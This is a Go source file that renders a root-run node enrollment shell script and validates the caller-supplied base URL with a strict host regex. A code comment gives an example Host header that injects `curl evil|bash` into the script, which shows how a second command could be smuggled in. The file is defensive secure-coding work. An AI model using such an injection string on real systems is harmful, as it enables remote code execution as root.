package handler

import (
	_ "embed"
	"regexp"
	"strings"
)

// enrollScriptTemplate is the node-side installer, kept as a real .sh file
// rather than a Go string so it stays shellcheck-able and diffable.
//
//go:embed enrollscript/enroll.sh
var enrollScriptTemplate string

// safeEnrollHost is what may appear in the script's PSP_BASE assignment.
//
// This is the sharp edge of the whole feature: the base URL is built from the
// request's Host header, which the caller controls, and the result is a shell
// script someone runs as root. A Host of `x'; curl evil|bash; :'` would
// otherwise be reflected straight into an executable. Both interpolated values
// are single-quoted in the template, and this pattern additionally admits no
// quote, backslash, whitespace or shell metacharacter — so there is nothing to
// escape rather than an escaping scheme to get right.
var safeEnrollHost = regexp.MustCompile(`^(?:[A-Za-z0-9](?:[A-Za-z0-9-]*[A-Za-z0-9])?)(?:\.[A-Za-z0-9](?:[A-Za-z0-9-]*[A-Za-z0-9])?)*(?::[0-9]{1,5})?$|^\[[0-9A-Fa-f:.]+\](?::[0-9]{1,5})?$`)

// EnrollBaseAllowed reports whether a scheme://host origin is safe to bake
// into the script. Exported for the handler and its tests.
func EnrollBaseAllowed(base string) bool {
	rest, ok := strings.CutPrefix(base, "https://")
	if !ok {
		rest, ok = strings.CutPrefix(base, "http://")
		if !ok {
			return false
		}
	}
	return safeEnrollHost.MatchString(rest)
}

// renderEnrollScript substitutes the two call-back parameters. Callers must
// have checked EnrollBaseAllowed and validEnrollToken first; this asserts
// nothing so the refusal happens at the handler, where a status code exists.
func renderEnrollScript(base, token string) string {
	r := strings.NewReplacer(
		"__PSP_BASE__", base,
		"__ENROLL_TOKEN__", token,
	)
	return r.Replace(enrollScriptTemplate)
}
